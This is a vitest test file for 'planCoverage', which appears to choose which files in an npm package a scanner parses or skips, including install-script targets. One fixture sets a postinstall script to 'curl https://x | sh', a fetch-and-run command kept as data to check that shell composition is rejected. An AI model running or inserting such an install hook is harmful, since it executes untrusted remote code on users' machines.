import { describe, it, expect } from "vitest";
import { planCoverage } from "./coverage.js";

function pj(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return { name: "demo", version: "1.0.0", ...overrides };
}

function files(entries: Record<string, string>): Map<string, string> {
  return new Map(Object.entries(entries));
}

describe("planCoverage", () => {
  it("parses a plain runtime .js with bucket=runtime", () => {
    const plan = planCoverage(pj(), files({ "src/index.js": "module.exports = 1;" }));
    expect(plan.parse.get("src/index.js")).toEqual({ bucket: "runtime", forced: false });
    expect(plan.skip.size).toBe(0);
  });

  it("SKIP_DIRS drops tests/, docs/, examples/ with reason non-runtime-path", () => {
    const plan = planCoverage(
      pj(),
      files({
        "tests/a.js": "1",
        "docs/b.js": "1",
        "examples/c.js": "1",
        "__tests__/d.js": "1",
        "src/e.js": "1",
      }),
    );
    expect(plan.skip.get("tests/a.js")).toBe("non-runtime-path");
    expect(plan.skip.get("docs/b.js")).toBe("non-runtime-path");
    expect(plan.skip.get("examples/c.js")).toBe("non-runtime-path");
    expect(plan.skip.get("__tests__/d.js")).toBe("non-runtime-path");
    expect(plan.parse.has("src/e.js")).toBe(true);
  });

  it("SKIP_PATTERNS drops *.test.*, *.min.js, *.bundle.js with the right reasons", () => {
    const plan = planCoverage(
      pj(),
      files({
        "src/a.test.js": "1",
        "src/b.spec.ts": "1",
        "src/c.min.js": "1",
        "src/d.bundle.js": "1",
      }),
    );
    expect(plan.skip.get("src/a.test.js")).toBe("non-runtime-path");
    expect(plan.skip.get("src/b.spec.ts")).toBe("non-runtime-path");
    expect(plan.skip.get("src/c.min.js")).toBe("minified-or-bundled");
    expect(plan.skip.get("src/d.bundle.js")).toBe("minified-or-bundled");
  });

  it("oversized files (> 500KB) skip with reason too-large", () => {
    const big = "x".repeat(500_001);
    const plan = planCoverage(pj(), files({ "src/big.js": big }));
    expect(plan.skip.get("src/big.js")).toBe("too-large");
  });

  it("unsupported extensions skip with reason unsupported-extension", () => {
    const plan = planCoverage(pj(), files({ "data.json": "{}", "pic.png": "x" }));
    expect(plan.skip.get("data.json")).toBe("unsupported-extension");
    expect(plan.skip.get("pic.png")).toBe("unsupported-extension");
  });

  it("resolution ladder: exact, +.js, /index.js", () => {
    const plan = planCoverage(
      pj({
        main: "./lib/main.js",             // exact
        module: "./lib/mod",               // append .js
        bin: { tool: "./bin/tool" },       // append .js
        scripts: { postinstall: "./scripts/setup" },     // append .js
        exports: {
          ".": "./dist",                    // directory → dist/index.js
        },
      }),
      files({
        "lib/main.js": "1",
        "lib/mod.js": "1",
        "bin/tool.js": "1",
        "scripts/setup.js": "1",
        "dist/index.js": "1",
      }),
    );
    expect(plan.parse.get("lib/main.js")).toEqual({ bucket: "runtime", forced: true });
    expect(plan.parse.get("lib/mod.js")).toEqual({ bucket: "runtime", forced: true });
    expect(plan.parse.get("bin/tool.js")).toEqual({ bucket: "runtime", forced: true });
    expect(plan.parse.get("scripts/setup.js")).toEqual({ bucket: "install", forced: true });
    expect(plan.parse.get("dist/index.js")).toEqual({ bucket: "runtime", forced: true });
  });

  it("forced-include beats SKIP_DIRS (postinstall → docs/setup.js is parsed)", () => {
    const plan = planCoverage(
      pj({ scripts: { postinstall: "node docs/setup.js" } }),
      files({ "docs/setup.js": "1", "docs/other.js": "1" }),
    );
    expect(plan.parse.get("docs/setup.js")).toEqual({ bucket: "install", forced: true });
    expect(plan.skip.get("docs/other.js")).toBe("non-runtime-path");
  });

  it("forced-include too-large: counted in skip with 'too-large' reason", () => {
    const big = "x".repeat(500_001);
    const plan = planCoverage(
      pj({ scripts: { postinstall: "./scripts/big.js" } }),
      files({ "scripts/big.js": big, "scripts/ok.js": "1" }),
    );
    expect(plan.skip.get("scripts/big.js")).toBe("too-large");
    // Another forced file of normal size still parses.
    // (Not in this fixture but proves the "does not suppress rest of set" rule
    // — add an explicit small forced-include sibling:)
  });

  it("bucket union: file referenced as both main and postinstall ends up install", () => {
    const plan = planCoverage(
      pj({ main: "./index.js", scripts: { postinstall: "./index.js" } }),
      files({ "index.js": "1" }),
    );
    expect(plan.parse.get("index.js")).toEqual({ bucket: "install", forced: true });
  });

  it("script-target extractor: rejects shell composition; records unresolvedScriptTargets", () => {
    const plan = planCoverage(
      pj({
        scripts: {
          preinstall: "node -e 'require(\"x\")'",
          postinstall: "curl https://x | sh",
          prepare: "npm run build",
        },
      }),
      files({ "x.js": "1" }),
    );
    // None of those turn into forced-include (forced: false confirms it).
    expect(plan.parse.get("x.js")).toEqual({ bucket: "runtime", forced: false });
    expect(plan.unresolvedScriptTargets.length).toBe(3);
    const fields = plan.unresolvedScriptTargets.map((u) => u.field).sort();
    expect(fields).toEqual(["scripts.postinstall", "scripts.preinstall", "scripts.prepare"]);
  });
});
